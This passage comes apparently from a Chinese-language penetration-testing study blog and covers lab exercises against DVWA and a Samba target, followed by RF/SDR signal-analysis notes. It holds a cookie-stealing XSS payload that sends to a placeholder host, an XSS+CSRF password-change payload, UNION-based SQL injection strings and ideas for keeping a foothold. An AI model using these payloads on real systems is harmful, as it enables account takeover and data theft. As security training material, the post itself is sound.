+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCripT&gt;new image().src=&quot;http://ip/output=&quot;+document.cookie;&lt;/sCripT&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://i.imgur.com/4Y4hqwD.png"></p>
+<p><img src="https://i.imgur.com/e26A9bc.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>XSS stored</p>
+<p><img src="https://i.imgur.com/gJi4QzR.png"></p>
+<p><img src="https://i.imgur.com/QEBAcB9.png"></p>
+<h2 id="靶機測試2-192-168-0-182"><a href="#靶機測試2-192-168-0-182" class="headerlink" title="靶機測試2(192.168.0.182)"></a>靶機測試2(192.168.0.182)</h2><ol>
+<li>蒐集資料<br>使用dirb蒐集網頁資料</li>
+</ol>
+<p>使用nmap -A 查看該主機有甚麼Port是開啟的<br><img src="https://i.imgur.com/M19pxyW.png"><br>其中可以朝samba掃描&#x2F;攻擊<br>(samba的洞挺多的)</p>
+<ol start="2">
+<li><p>開啟msfconsolse<br><img src="https://i.imgur.com/zXZNme2.png"></p>
+</li>
+<li><p>Search samba漏洞<br><img src="https://i.imgur.com/4FDBxJQ.png"></p>
+</li>
+<li><p>編譯漏洞腳本<br><img src="https://i.imgur.com/4LaDpTB.png"></p>
+</li>
+<li><p>執行漏洞腳本<br><img src="https://i.imgur.com/97zdWV8.png"><br>(即可連進去取得root)</p>
+</li>
+</ol>
+<p>要怎麼維持連線程序????<br><strong>越貼近使用者行為越好越難發現</strong><br>1.	建一個新的帳號<br>2.	爆破它其他的帳號密碼<br>3.	塞一個服務 (但有可能會被AD斷掉)<br>4.	建一個連線回到自己主機 (但有可能會被AD斷掉)</p>
+<p>How To Create a Sudo User in Linux?<br><a target="_blank" rel="noopener" href="https://www.digitalocean.com/community/tutorials/how-to-create-a-sudo-user-on-ubuntu-quickstart">https://www.digitalocean.com/community/tutorials/how-to-create-a-sudo-user-on-ubuntu-quickstart</a></p>
+<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>攔截修改密碼的頁面<br><img src="https://i.imgur.com/FUBku23.png"></p>
+<p>複製封包的URI<br><img src="https://i.imgur.com/1LTXzYP.png"></p>
+<p>執行URI即可更改密碼<br><img src="https://i.imgur.com/POuyWXz.png"><br>將URI拿去縮短網址就能夠更加隱蔽</p>
+<h3 id="XSS-CSRF-組合技"><a href="#XSS-CSRF-組合技" class="headerlink" title="XSS+CSRF 組合技"></a>XSS+CSRF 組合技</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new Image().src=&quot;更改密碼的URI&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>反射型:點到這個圖片就會被更改</li>
+<li>儲存型:登入後帶著cookie瀏覽到特定圖片就會被更改</li>
+</ul>
+<h3 id="SQL-Injection-脫庫"><a href="#SQL-Injection-脫庫" class="headerlink" title="SQL Injection(脫庫)"></a>SQL Injection(脫庫)</h3><p>server端並未經過過濾使用輸入SQL語法進行解析並將結果返回<br>SQL基礎使用:</p>
+<ul>
+<li>Select DB</li>
+<li>Select table</li>
+<li>Select column</li>
+<li>Data</li>
+</ul>
+<p>登入DB</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -h IP</span><br><span class="line">show DB;</span><br><span class="line">use dvwa;</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/aK34Mju.png"><br><img src="https://i.imgur.com/pmUsGxs.png"></p>
+<p>select<br><img src="https://i.imgur.com/2ljNhS8.png"><br><img src="https://i.imgur.com/dmWdah5.png"></p>
+<p>Information Schema</p>
+<ul>
+<li>Information_schema.schemata 所有db</li>
+<li>Information_schema.tables 所有table</li>
+<li>Information_schema.columns 所有的欄位</li>
+</ul>
+<p><img src="https://i.imgur.com/Adjm06U.png"><br><img src="https://i.imgur.com/f6uOTKJ.png"></p>
+<p>輸入1會產生ID1的資訊<br><img src="https://i.imgur.com/kpFZTul.png"><br>因此可以使用select語法輸入所有的db</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x27; union select 1, schema_name from information_schema.schemata # </span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/iQecQTk.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x27; union select 1, table_name from information_schema.tables # </span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/O5Ba3HO.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x27; union select 1, table_name from information_schema.tables where table_name=&#x27;dvwa&#x27;# </span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/sLCOQpN.png"></p>
+<p><img src="https://i.imgur.com/mRMPxDH.png"></p>
+<p><img src="https://i.imgur.com/9QEBR9x.png"></p>
+<hr>
+<h2 id="好用資源"><a href="#好用資源" class="headerlink" title="好用資源"></a>好用資源</h2><ul>
+<li>Payload All The Things<br><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></li>
+<li>GTFObins: 各種Reverse Shell<br><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
+<li>XSS Bypass Filter<br><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</a></li>
+</ul>
+<hr>
+<h2 id="RF-滲透測試"><a href="#RF-滲透測試" class="headerlink" title="RF 滲透測試"></a>RF 滲透測試</h2><p>安裝基本套件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnuradio </span><br><span class="line">sudo apt-get install gr-osmosdr</span><br><span class="line">sudo apt-get install rtl-sdr</span><br><span class="line">rtl_test</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/Dpat9WW.png"></p>
+<p><strong>開啟osmocom_fft</strong><br>osmocom_fft<br><img src="https://i.imgur.com/Ewe4E1Y.png"></p>
+<h3 id="通訊概論"><a href="#通訊概論" class="headerlink" title="通訊概論"></a>通訊概論</h3><p>訊號：</p>
+<ul>
+<li>類比訊號(陸譯:模擬訊號):根據震幅的改變而產生的訊號，可以用來乘載訊號<ul>
+<li>赫茲(Hz):每秒震盪幾次</li>
+</ul>
+</li>
+<li>數位訊號:表示為0or1，不是用來乘載訊息的</li>
+</ul>
+<p>頻率:每秒震盪幾次，每秒周期數<br>頻寬:用來描述頻率的範圍，又稱為帶寬</p>
+<p>fft 演算法:</p>
+<ul>
+<li>中心頻率(Center Frequency):(f max + f min)&#x2F;2</li>
+<li>頻寬(Bandwideth, channel width): |f max- f min|</li>
+</ul>
+<p>頻譜分配:<br><img src="https://i.imgur.com/YFYcJnm.png"></p>
+<p>ISM頻段:</p>
+<ul>
+<li>無需使用執照與向政府繳交費用</li>
+<li>2.4GHz, 868Mhz</li>
+</ul>
+<p>Sub -1G頻段:</p>
+<ul>
+<li>小於1GHz的頻段被稱為Sub -1GHz</li>
+</ul>
+<p>發收端:調變-&gt;訊息X載波&#x3D;訊號<br>接收端:解調變</p>
+<ul>
+<li>類比調變<ul>
+<li>頻率調變(FM):利用訊號頻率密度來表示</li>
+<li>振幅調變(AM):利用訊號震幅高低表示</li>
+<li>相位調變(PM):利用不同的相位(角度)來表示</li>
+</ul>
+</li>
+<li>數位調變<ul>
+<li>振幅偏移調變(ASK)</li>
+<li>頻率偏移調變(FSK)</li>
+<li>相位偏移調變(PSK)</li>
+<li>正交分多工調變(OFDM) ex.WiFi</li>
+</ul>
+</li>
+<li>比較<br>  <img src="https://i.imgur.com/dY7rAqQ.jpg"></li>
+</ul>
+<p>單工:純接收、純發射<br>半雙工:接收發射同時間下能擇一 ex.無線電<br>雙工:同時間下能透發射&amp;接收 ex.手機</p>
+<p>電流:<br>導體上的電流 - 發射機(Tx) -&gt; air interface -&gt; 接收機(Rx) - 導體上的電流</p>
+<p>Wireless IC Dongle<br><img src="https://i.imgur.com/1ZEd9lh.jpg"><br>SDR Flatforms<br><img src="https://i.imgur.com/W28jivl.jpg"></p>
+<p>Wireless IC Dongle VS SDR Flatforms</p>
+<ul>
+<li>Wireless IC Dongle:收到訊號以後，將已解調訊號傳至電腦</li>
+<li>SDR Flatforms:收到訊號以後，將未解調訊號傳至電腦</li>
+</ul>
+<p>增益VS損耗</p>
+<ul>
+<li>增益(Gain):輸出的訊號&gt;輸入的訊號 ,根據質量守恆定理，訊號不會無緣無故變大，因此會經過電流加大訊號</li>
+<li>損耗(Loss):輸入的訊號&gt;輸出的訊號 ,透過發熱進行能量守恆的轉換</li>
+</ul>
+<p>使用分貝當作比較的條件</p>
+<p>採樣定理:<br>將一個類比訊號經過採樣轉換成一個數位訊號，需要用幾個點表示一個波?</p>
+<blockquote>
+<p>&lt;fs採樣率  f採樣頻率 B頻寬&gt;</p>
+</blockquote>
+<ol>
+<li>低通採樣定理:採樣率至少為採樣頻率的兩倍<br> fs &#x3D; 2 x f</li>
+<li>帶通採樣定理:採樣率至少為頻寬的兩倍<br> fs &#x3D; 2 x B</li>
+</ol>
+<ul>
+<li><p>抽取(Decimation):降低採樣率</p>
+</li>
+<li><p>內插(Interpolation):提高採樣率</p>
+</li>
+<li><p>混疊現象(Aliasing Effect):會發生在訊號中心頻率+-採樣率的頻率</p>
+</li>
+</ul>
+<p>匹配:</p>
+<ul>
+<li>射頻訊號 阻抗 50 Ω(Ohm）</li>
+<li>視頻訊號 阻抗 75 Ω(Ohm)</li>
+<li>匹配不良:射頻信號會有反射問題，嚴重的話可能會燒掉</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnuradio-companion</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/oKM0usX.png"></p>
+<p>圖中每一個都是功能模組相連<br>NBFM Receive為解調訊號的Seceive，沒有它就不會work<br><img src="https://i.imgur.com/03kHTTz.png"></p>
+<p>開啟一個新的流程圖<br>File&gt;New&gt;WX GUI<br><img src="https://i.imgur.com/zvMNJRR.png"><br>區域介紹<br><img src="https://i.imgur.com/o05gLr3.png"><br>RTL-SDR參數設定<br><img src="https://i.imgur.com/UCRfAXd.png"><br>可以更改變數，使所有和samp_rate之變數全部更改<br><img src="https://i.imgur.com/GgUS5UZ.png"></p>
+<p>將rtl收到的所有訊號存到file<br><img src="https://i.imgur.com/bKGy7Eq.png"><br>給file_sink儲存的位址<br><img src="https://i.imgur.com/gAJTMBu.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inspectrum &lt;file&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/Jf8QIdk.png"></p>
+<h3 id="元件"><a href="#元件" class="headerlink" title="元件"></a>元件</h3><p>有源:需要電源運作<br>無源:不須電源運作</p>
+<ul>
+<li><p>放大器:</p>
+<ul>
+<li>三種屬性:增益、噪聲係數、線性<ul>
+<li>Gain:使用dB表示</li>
+<li>噪聲係數:使用dB表示</li>
+<li>線性:失真程度</li>
+</ul>
+</li>
+<li>三類:低噪音、高功率、其他</li>
+</ul>
+</li>
+<li><p>天線</p>
+<ul>
+<li>天線:接收訊號與發射訊號<ul>
+<li>全向天線:全樣都有</li>
+<li>指向天線:只有一個角度</li>
+<li>增益天線:捨去電磁場﹑非功率增益而是方向增益</li>
+<li>主動天線:必含功率增益</li>
+</ul>
+</li>
+<li>頻率:決定天線的大小</li>
+<li>傳播方向:決定天性的形狀<ul>
+<li>全向:全樣都有</li>
+<li>指向:只有一個角度</li>
+</ul>
+</li>
+<li>功率:決定天線的大小</li>
+</ul>
+</li>
+<li><p>濾波器</p>
+<ul>
+<li>已”頻率”劃分不同訊號<br>  <img src="https://i.imgur.com/A44cWOA.jpg"></li>
+<li>頻率響應:超過他的憑率較果會下降</li>
+<li>過濾你不要的頻率</li>
+</ul>
+</li>
+<li><p>混頻器:</p>
+<ul>
+<li>改變訊號頻率，但保持其他特性，也就是做調變的功能</li>
+<li>通常混頻器後面會接一個濾波器</li>
+<li>比較沒辦法數位化</li>
+</ul>
+</li>
+<li><p>振盪器:</p>
+<ul>
+<li>比較沒辦法數位化</li>
+</ul>
+</li>
+<li><p>元件比較<br>  <img src="https://i.imgur.com/sQIJs7D.jpg"></p>
+</li>
+<li><p>元件溝通</p>
+<ul>
+<li><p>發射機<br>  <img src="https://i.imgur.com/DrcyGdD.jpg"></p>
+</li>
+<li><p>接收機</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h3><p>流程:</p>
+<ol>
+<li>Find the signal</li>
+<li>Capture the signal</li>
+<li>Analyze the signal</li>
+</ol>
+<h4 id="Analyze-the-signal"><a href="#Analyze-the-signal" class="headerlink" title="Analyze the signal:"></a>Analyze the signal:</h4><ul>
+<li>前導碼(Preamble):告訴雙方要準備連線了<ul>
+<li>常見的的:0xaaaa, 0x5555</li>
+</ul>
+</li>
+<li>同步碼(Sync Word):我現在開始要傳資料了喔!<ul>
+<li>堂見的:0xd391</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://i.imgur.com/naYlFWK.png"></p>
+<p><img src="https://i.imgur.com/LzH7Dfk.png"></p>
+<blockquote>
+<p>FFT size:調整頻率軸縮放<br>Zoom:調整時間<br>Power Max:調整訊號顯示<br>Power Min:調整背景噪音顯示<br>調整Zoom &amp; FFT size<br><img src="https://i.imgur.com/COKLijI.jpg"></p>
+</blockquote>
+<p><img src="https://i.imgur.com/GEQlM5t.png"><br>讓紅線貼近訊號<br><img src="https://i.imgur.com/MNNMpqH.png"></p>
+<p>可以看見下方的振幅(綠色的線)<br><img src="https://i.imgur.com/aEW6fvE.jpg"></p>
+<h4 id="urh-訊號分析"><a href="#urh-訊號分析" class="headerlink" title="urh 訊號分析"></a>urh 訊號分析</h4><p><img src="https://i.imgur.com/cmzuK6s.png"><br>analysis<br><img src="https://i.imgur.com/aGQYkkS.png"></p>
+<h3 id="分析練習"><a href="#分析練習" class="headerlink" title="分析練習"></a>分析練習</h3><h4 id="Doorball練習"><a href="#Doorball練習" class="headerlink" title="Doorball練習"></a>Doorball練習</h4><p>frequency 240~960MHz</p>
+<p>modulation OOK(One of Key 是ASK的一種) or ASK</p>
+<p>preamble size 0<br>preamble 0x55 or 0xaa</p>
+<p>Sync size 32bits<br>Sync Word 0x80000000</p>
+<p>Packet Structure:<br>Sync+(0x8eee8ee88eee888e888888e88)*39+0x8eee8ee88eee888e888888e8</p>
+<p>了解封包結構以後，接下來就是可以去模擬一個類似的packet structure回傳給IOT裝置，如果原先的訊號沒有過濾需要的值，也就是說在Data的部分更改長度or更改內容，IOT會不會爆掉</p>
+<p>PWM</p>
+<ul>
+<li>高高低1</li>
+<li>高低低0</li>
+<li>PWM 逼碼常與ASK進行調變</li>
+<li>bit rate&#x3D; baud rate &#x2F; 3 &#x3D; symbol rate &#x2F; 3<br>Manchester慢測試</li>
+<li>高電壓到低電壓是0</li>
+<li>低電壓到高電壓是1</li>
+<li>bit rate &#x3D; baud rate &#x2F; 2 &#x3D; symbol &#x2F;2</li>
+</ul>
+<h4 id="Unknow練習"><a href="#Unknow練習" class="headerlink" title="Unknow練習"></a>Unknow練習</h4><ul>
+<li><p>Identify Application</p>
+<ul>
+<li>remote controlled car application</li>
+</ul>
+</li>
+<li><p>Identify Modulation Type</p>
+<ul>
+<li>ASK&#x2F;OOK</li>
+</ul>
+</li>
+<li><p>Identify Preamble</p>
+<ul>
+<li>No</li>
+</ul>
+</li>
+<li><p>Identify Sync Word</p>
+<ul>
+<li>4*W2 or W2都行</li>
+</ul>
+</li>
+<li><p>Identify Encoding</p>
+<ul>
+<li>NRZ (常與ASK做調變 but this case 例外)</li>
+</ul>
+</li>
+<li><p>Identify 4 Signal Function</p>
+<ul>
+<li><img src="https://i.imgur.com/cZLi4qY.png"></li>
+<li>上 w2x4 + w1x10</li>
+<li>下 w2x4 + w1x40</li>
+<li>右 w2x4 + w1x64</li>
+<li>左 w2x4 + w1x58</li>
+</ul>
+</li>
+<li><p>Identify Packet Structure<br><img src="https://i.imgur.com/3oTSfia.png"><br><img src="https://i.imgur.com/GokBAQ8.png"></p>
+</li>
+</ul>
+<h2 id="apache2-server"><a href="#apache2-server" class="headerlink" title="apache2 server"></a>apache2 server</h2><p><strong>Reference</strong><br><a target="_blank" rel="noopener" href="https://ubuntu.com/tutorials/install-and-configure-apache#2-installing-apache">https://ubuntu.com/tutorials/install-and-configure-apache#2-installing-apache</a><br><a target="_blank" rel="noopener" href="https://www.cyberciti.biz/faq/star-stop-restart-apache2-webserver/">https://www.cyberciti.biz/faq/star-stop-restart-apache2-webserver/</a></p>
+<ul>
+<li>install<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install apache2</span><br></pre></td></tr></table></figure></li>
+<li>start<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo /etc/init.d/apache2 start</span><br></pre></td></tr></table></figure></li>
+<li>restart<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure></li>
+<li>stop<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo /etc/init.d/apache2 stop</span><br></pre></td></tr></table></figure></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://leozzmc.github.io">Kevin Liu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章連結: </span><span class="post-copyright-info"><a href="https://leozzmc.github.io/posts/8ec27a58.html">https://leozzmc.github.io/posts/8ec27a58.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版權聲明: </span><span class="post-copyright-info">本部落格所有文章除特別聲明外，均採用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 許可協議。轉載請註明來自 <a href="https://leozzmc.github.io" target="_blank">Kevin Liu's 部落格 || Technical || Travel</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></div><div class="post_share"><div class="social-share" data-image="/img/me.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/5728fae1.html" title="📑 DMS_Troubleshooting 筆記"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">📑 DMS_Troubleshooting 筆記</div></div></a></div><div class="next-post pull-right"><a href="/posts/e8acb5ee.html" title="🔋 AWS Certified Cloud Practitioner 證照準備筆記"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">🔋 AWS Certified Cloud Practitioner 證照準備筆記</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 評論</span></div></div><div class="comment-wrap"><div><div id="utterances-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/me.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Kevin Liu</div><div class="author-info__description">👍👍👍👍👍</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">54</div></a><a href="/tags/"><div class="headline">標籤</div><div class="length-num">63</div></a><a href="/categories/"><div class="headline">分類</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/leozzmc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/leozzmc" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:zzmczzmczzmc870125@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #e0ad5a;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/kevin-liu087" target="_blank" title="LinkedIn"><i class="fa-brands fa-linkedin" style="color: #0373fc;"></i></a><a class="social-icon" href="https://www.youtube.com/channel/UC2AU_vpxPu0oKcgZl3UJSNg" target="_blank" title="Youtube"><i class="fa-brands fa-youtube" style="color: #dc1e1e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">🛫🛬</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目錄</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PT-%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6-vs-RT-%E7%B4%85%E9%9A%8A%E6%BC%94%E7%B7%B4"><span class="toc-number">1.</span> <span class="toc-text">PT(滲透測試) vs RT(紅隊演練)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">滲透測試流程:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IOT%E7%9A%84%E6%94%BB%E6%93%8A%E5%90%91%E9%87%8F-Attack-Vector"><span class="toc-number">3.</span> <span class="toc-text">IOT的攻擊向量(Attack Vector)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B6%B2%E9%A0%81%E7%9A%84%E6%94%BB%E6%93%8A%E5%90%91%E9%87%8F"><span class="toc-number">4.</span> <span class="toc-text">網頁的攻擊向量</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E6%93%8A%E6%A8%99%E7%9A%84"><span class="toc-number">5.</span> <span class="toc-text">攻擊標的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">6.</span> <span class="toc-text">常用工具:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Command-Injection"><span class="toc-number">7.</span> <span class="toc-text">Command Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA"><span class="toc-number">8.</span> <span class="toc-text">DVWA</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Reverse-shell"><span class="toc-number">8.0.1.</span> <span class="toc-text">Reverse shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%A9%9F%E6%B8%AC%E8%A9%A6-192-168-5-107"><span class="toc-number">9.</span> <span class="toc-text">靶機測試(192.168.5.107)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NET-config"><span class="toc-number">9.1.</span> <span class="toc-text">NET config</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Upload"><span class="toc-number">9.2.</span> <span class="toc-text">File Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI-Local-File-Inclusion"><span class="toc-number">9.3.</span> <span class="toc-text">LFI(Local File Inclusion)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RFI-Remote-File-Inclusion"><span class="toc-number">9.4.</span> <span class="toc-text">RFI(Remote File Inclusion)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">9.5.</span> <span class="toc-text">XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%A9%9F%E6%B8%AC%E8%A9%A62-192-168-0-182"><span class="toc-number">10.</span> <span class="toc-text">靶機測試2(192.168.0.182)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-number">10.1.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-CSRF-%E7%B5%84%E5%90%88%E6%8A%80"><span class="toc-number">10.2.</span> <span class="toc-text">XSS+CSRF 組合技</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-%E8%84%AB%E5%BA%AB"><span class="toc-number">10.3.</span> <span class="toc-text">SQL Injection(脫庫)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%BD%E7%94%A8%E8%B3%87%E6%BA%90"><span class="toc-number">11.</span> <span class="toc-text">好用資源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RF-%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6"><span class="toc-number">12.</span> <span class="toc-text">RF 滲透測試</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%A8%8A%E6%A6%82%E8%AB%96"><span class="toc-number">12.1.</span> <span class="toc-text">通訊概論</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%83%E4%BB%B6"><span class="toc-number">12.2.</span> <span class="toc-text">元件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B"><span class="toc-number">12.3.</span> <span class="toc-text">逆向工程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Analyze-the-signal"><span class="toc-number">12.3.1.</span> <span class="toc-text">Analyze the signal:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#urh-%E8%A8%8A%E8%99%9F%E5%88%86%E6%9E%90"><span class="toc-number">12.3.2.</span> <span class="toc-text">urh 訊號分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%B7%B4%E7%BF%92"><span class="toc-number">12.4.</span> <span class="toc-text">分析練習</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Doorball%E7%B7%B4%E7%BF%92"><span class="toc-number">12.4.1.</span> <span class="toc-text">Doorball練習</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unknow%E7%B7%B4%E7%BF%92"><span class="toc-number">12.4.2.</span> <span class="toc-text">Unknow練習</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apache2-server"><span class="toc-number">13.</span> <span class="toc-text">apache2 server</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/59f3a7b5.html" title="簡化路徑 | Medium | LeetCode#71. Simplify Path"><img src="/img/LeetCode/71/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="簡化路徑 | Medium | LeetCode#71. Simplify Path"/></a><div class="content"><a class="title" href="/posts/59f3a7b5.html" title="簡化路徑 | Medium | LeetCode#71. Simplify Path">簡化路徑 | Medium | LeetCode#71. Simplify Path</a><time datetime="2024-07-07T06:22:35.000Z" title="發表於 2024-07-07 14:22:35">2024-07-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/511cdb2f.html" title="Min 堆疊 | Medium | LeetCode#155 Min Stack"><img src="/img/LeetCode/155/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Min 堆疊 | Medium | LeetCode#155 Min Stack"/></a><div class="content"><a class="title" href="/posts/511cdb2f.html" title="Min 堆疊 | Medium | LeetCode#155 Min Stack">Min 堆疊 | Medium | LeetCode#155 Min Stack</a><time datetime="2024-07-06T12:44:36.000Z" title="發表於 2024-07-06 20:44:36">2024-07-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/31bdd3b4.html" title="括號的最大嵌套深度 | Easy |LeetCode#1614. Maximum Nesting Depth of the Parentheses"><img src="/img/LeetCode/1614/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="括號的最大嵌套深度 | Easy |LeetCode#1614. Maximum Nesting Depth of the Parentheses"/></a><div class="content"><a class="title" href="/posts/31bdd3b4.html" title="括號的最大嵌套深度 | Easy |LeetCode#1614. Maximum Nesting Depth of the Parentheses">括號的最大嵌套深度 | Easy |LeetCode#1614. Maximum Nesting Depth of the Parentheses</a><time 